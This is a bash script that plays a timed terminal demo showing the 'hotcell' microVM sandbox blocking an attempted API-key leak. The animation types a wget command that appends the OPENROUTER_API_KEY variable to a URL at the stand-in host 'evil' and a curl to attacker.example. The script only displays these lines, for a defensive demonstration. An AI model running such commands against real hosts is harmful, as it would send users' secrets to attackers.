#!/usr/bin/env bash
# RIGHT pane — hotcell microVM. Same beats/timing as left. Content verbatim from
# the real local VZ run (token not key; ip link = lo only; Network unreachable;
# collector count 0).
now(){ perl -MTime::HiRes=time -e 'printf "%.3f", time'; }
S=$(now); wait_to(){ awk -v t="$1" -v s="$S" -v n="$(now)" 'BEGIN{d=t-(n-s); if(d>0) system("sleep " d)}'; }
tp(){ local x="$1" i; for((i=0;i<${#x};i++)); do printf '%s' "${x:$i:1}"; sleep 0.028; done; printf '\n'; }
P(){ printf '\033[38;5;244magent@hotcell\033[0m:~# '; }
G(){ printf '\033[38;5;114m%s\033[0m\n' "$1"; }   # green
D(){ printf '\033[38;5;244m%s\033[0m\n' "$1"; }   # dim

clear
printf '\033[1m  hotcell — npm install -g hotcell\033[0m\n\n'
wait_to 2;  P; tp 'echo $OPENROUTER_API_KEY'
wait_to 4;  G 'hc-60c96201d972a2ee6c1ed78253c68723681f…'
wait_to 6;  D '# a revocable token — the real key is on the daemon'
wait_to 9;  echo; P; tp '# the same dependency runs:'
wait_to 12; P; tp 'wget "http://evil/?key=$OPENROUTER_API_KEY"'
wait_to 16; D 'wget: cannot connect: Network unreachable'
wait_to 17; P; tp 'ip link'
wait_to 20; printf '1: \033[38;5;114mlo\033[0m: <LOOPBACK,UP>   \033[38;5;244m# the only interface — no network card\033[0m\n'
wait_to 22; echo; P; tp 'curl attacker.example/collected'
wait_to 25; G '{"count": 0}'
wait_to 27; echo; printf '\033[1;38;5;114m  🔒  keys leaked: 0\033[0m\n'
wait_to 33; :
